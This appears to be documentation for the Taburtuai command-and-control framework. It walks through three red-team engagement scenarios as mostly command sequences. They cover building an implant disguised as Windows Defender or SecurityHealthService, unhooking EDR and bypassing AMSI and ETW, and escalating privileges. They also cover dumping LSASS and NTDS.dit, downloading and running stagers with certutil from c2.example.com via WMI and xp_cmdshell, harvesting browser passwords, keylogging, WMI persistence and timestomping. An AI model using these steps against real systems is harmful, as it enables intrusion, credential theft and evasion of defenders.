# Engagement Scenarios

Full attack chain examples combining multiple Taburtuai C2 capabilities into coherent engagement workflows.

---

## Scenario 1: Initial Access to Domain Compromise

**Objective:** Gain Domain Admin access starting from a phished employee workstation.

**Target:** Mid-size corporate environment, Active Directory domain, Windows Defender + Defender for Endpoint.

---

### Phase 1 — Initial Access

Build a stealth agent disguised as a Windows security component:

```bash
./bin/taburtuai-generate stageless \
  --server https://c2.example.com \
  --key 'EngKey2026' \
  --c2-profile office365 \
  --profile stealth \
  --masq-company "Microsoft Corporation" \
  --masq-desc "Windows Security Health Service" \
  --masq-origfile "SecurityHealthService.exe" \
  --kill-date 2026-06-30 \
  --strip \
  --no-gui \
  --os windows --arch amd64 \
  --output ./builds/SecurityHealthService.exe
```

Deliver via phishing (macro-enabled document, LNK file, or ClickFix lure — see delivery templates).

---

### Phase 2 — Establish Foothold

Agent checks in. First actions:

```
# Verify we're on a real machine
❯ opsec antidebug a1b2
[+] No debugger detected.

❯ opsec antivm a1b2
[+] No VM detected.

# Understand our context
❯ cmd a1b2 "whoami /all"
# → corp\jsmith, standard user, medium integrity

❯ agents info a1b2
# → WORKSTATION-07, Windows 10 19041, amd64

❯ screenshot a1b2 --save /loot/initial_desktop.bmp
# → Shows user's actual desktop, confirms interactive session

# Remove EDR hooks before anything else
❯ evasion unhook a1b2
❯ bypass amsi a1b2
❯ bypass etw a1b2
```

---

### Phase 3 — Local Privilege Escalation

Standard user can't dump LSASS. Look for escalation paths:

```
# Check for local admin
❯ cmd a1b2 "net localgroup administrators"
# → Only CORP\Domain Admins and a service account

# Check for unquoted service paths, weak ACLs, etc.
❯ cmd a1b2 "wmic service get name,pathname,startmode | findstr /i /v \"c:\\windows\\\\\""
# → Found: C:\Program Files\ThirdParty Corp\updater service.exe  (unquoted path)

# Upload exploit or use token via a vulnerable service
❯ cmd a1b2 "sc stop \"ThirdPartyUpdater\""
❯ files upload a1b2 ./tools/malicious.exe "C:\Program Files\ThirdParty Corp\updater.exe"
❯ cmd a1b2 "sc start \"ThirdPartyUpdater\""
# → Privilege escalation via unquoted service path

# Now running as SYSTEM
❯ cmd a1b2 "whoami"
# → NT AUTHORITY\SYSTEM
```

---

### Phase 4 — Credential Access

With SYSTEM, dump LSASS:

```
❯ creds lsass a1b2
[+] LSASS dump saved: C:\Windows\Temp\upd_data.tmp

❯ files download a1b2 "C:\Windows\Temp\upd_data.tmp" /loot/lsass.dmp
❯ cmd a1b2 "del C:\Windows\Temp\upd_data.tmp"

# Timestomp the evidence
❯ timestomp a1b2 "C:\Windows\Temp" --ref "C:\Windows\System32\svchost.exe"
```

Parse offline:
```bash
pypykatz lsa minidump /loot/lsass.dmp

# Results:
# corp\jsmith : [NTLM] a1b2c3d4...  [password] Summer2024!
# corp\svc_sql : [NTLM] e5f6a7b8...
# corp\domain.admin : [NTLM] c9d0e1f2...  [password] D0mAdm!n2024
```

---

### Phase 5 — Lateral Movement to Domain Controller

```
# Set up domain admin context
❯ token make a1b2 --user domain.admin --domain corp --pass "D0mAdm!n2024"

# Verify access to DC
❯ netscan a1b2 -t 10.0.0.5 -p 445,389,3268

# Move to DC via WMI (stager download)
❯ lateral wmi a1b2 10.0.0.5 \
    "cmd /c certutil -urlcache -f https://c2.example.com/stage/agent C:\Temp\svc.exe && C:\Temp\svc.exe"

# New agent checks in from DC01
❯ agents list
[+] Found 2 agent(s)
b2c3d4e5-...  DC01  corp\domain.admin  online  ...
```

---

### Phase 6 — Domain Compromise

On the DC agent:

```
# Evasion on new agent
❯ evasion unhook b2c3
❯ bypass amsi b2c3
❯ bypass etw b2c3

# Dump entire SAM + NTDS
❯ creds lsass b2c3
❯ files download b2c3 "C:\Temp\lsass_dc.dmp" /loot/dc_lsass.dmp

# Download NTDS.dit (requires VSS or ntdsutil)
❯ cmd b2c3 "ntdsutil \"ac i ntds\" \"ifm\" \"create full C:\Temp\ntds_dump\" q q"
❯ files download b2c3 "C:\Temp\ntds_dump\Active Directory\ntds.dit" /loot/ntds.dit
❯ files download b2c3 "C:\Temp\ntds_dump\registry\SYSTEM" /loot/SYSTEM
```

Parse for all domain hashes:
```bash
secretsdump.py -ntds /loot/ntds.dit -system /loot/SYSTEM LOCAL
# → All domain account NTLM hashes
```

---

### Phase 7 — Cleanup

```
# Remove DC agent
❯ cmd b2c3 "del C:\Temp\svc.exe && rmdir /s /q C:\Temp\ntds_dump"
❯ persistence remove b2c3 --method registry_run --name "..."
❯ agents delete b2c3

# Remove original agent
❯ persistence remove a1b2 --method registry_run --name "..."
❯ cmd a1b2 "del 'C:\Program Files\ThirdParty Corp\updater.exe'"
❯ agents delete a1b2
```

---

## Scenario 2: Assumed-Breach Internal Pivot

**Objective:** Starting as a standard corporate user (assumed breach), reach isolated PCI/finance segment.

---

### Starting Point

Agent running as `corp\finance_user` on `FINANCE-WS-03`.

```
❯ agents info f1n4
# → corp\finance_user, Windows 11, medium integrity

# Recon the network
❯ arpscan f1n4 --wait
# → 10.0.10.0/24 segment, ~20 hosts

❯ netscan f1n4 -t 10.0.10.0/24 -p 445,3389,5985,1433 --wait
# → 10.0.10.5 : 445 open (SMB), 3389 open
# → 10.0.10.10 : 1433 open (SQL Server)
# → 10.0.10.20 : 5985 open (WinRM)
```

### Browser Credential Harvest (No Escalation Needed)

```
❯ creds browser f1n4
[+] Browser credentials:
  URL: https://erp.corp.internal
  Username: finance.user@corp.com
  Password: ERPAccess2024!

  URL: https://sqlreports.corp.internal
  Username: sa_finance
  Password: SqlReport#2024
```

### Access SQL Server

```
# Port forward SQL to operator machine
❯ portfwd start f1n4 --local 1433 --remote 10.0.10.10:1433

# Use impacket from operator machine
mssqlclient.py sa_finance:SqlReport#2024@127.0.0.1 -windows-auth

SQL> exec xp_cmdshell 'whoami'
# → corp\svc_sql

SQL> exec xp_cmdshell 'certutil -urlcache -f http://c2.example.com/stage C:\Temp\s.exe && C:\Temp\s.exe'
# → New agent on SQL server
```

### Pivot to Finance Segment

With SOCKS5 through the SQL server agent:

```
❯ socks5 start sql1 --addr 127.0.0.1:1081

proxychains evil-winrm -i 10.0.10.20 -u finance.user -p ERPAccess2024!
```

---

## Scenario 3: Red Team — Quiet Long-Term Access

**Objective:** Establish persistent, ultra-quiet access for a 4-week engagement simulating APT persistence.

---

### Build Configuration

```bash
./bin/taburtuai-generate stageless \
  --server https://c2.example.com \
  --key 'EngKey2026LT' \
  --c2-profile ocsp \
  --profile paranoid \
  --front-domain cdn.azure.microsoft.com \
  --masq-company "Microsoft Corporation" \
  --masq-desc "Antimalware Service Executable" \
  --masq-origfile "MsMpEng.exe" \
  --kill-date 2026-06-30 \
  --strip \
  --no-gui \
  --os windows --arch amd64 \
  --output ./builds/MsMpEng_upd.exe
```

**Parameters chosen:**
- `ocsp` profile + domain fronting: traffic looks like certificate validation
- `paranoid` OPSEC: beacons every 10 minutes, 09:00–17:00 only
- Masquerade as Windows Defender: immediate credibility to any analyst
- 4-week kill date: self-destructs at engagement end

### WMI Persistence (Maximum Stealth)

```
❯ persistence setup q1t4 --method wmi_subscription --name "SystemCacheManager"
[+] WMI subscription created. Invisible to Task Scheduler and most Autoruns variants.
```

### Keylogger Running During Business Hours

```
❯ keylog start q1t4
# Let it run during the 4-week engagement
# Dump periodically
❯ keylog dump q1t4
# → Credentials, internal URLs, sensitive data
```

### Weekly Screenshot Collection

During each week's active window:
```
❯ screenshot q1t4 --save /loot/week1_mon.bmp
```

This provides visibility into what the target user does without any active commands, minimizing detection surface.

---

## Quick Reference: Common Engagement Sequence

```
# Establish foothold
→ evasion unhook / bypass amsi / bypass etw

# Map the environment
→ cmd "whoami /all"   → privileges
→ cmd "ipconfig /all" → network
→ arpscan             → live hosts
→ netscan             → services
→ process list        → security software

# Escalate (if needed)
→ token list          → find high-priv token
→ token steal         → or use creds for make_token

# Collect credentials
→ creds lsass         → NTLM hashes + cleartext
→ creds sam           → local hashes
→ creds browser       → web app passwords
→ keylog start        → capture future credentials

# Move laterally
→ lateral wmi <target> "download + run agent"
→ (repeat on new agent)

# Achieve objective

# Maintain access (if in scope)
→ persistence setup --method wmi_subscription

# Cleanup
→ persistence remove
→ delete dropped files
→ timestomp modified locations
→ agents delete
```
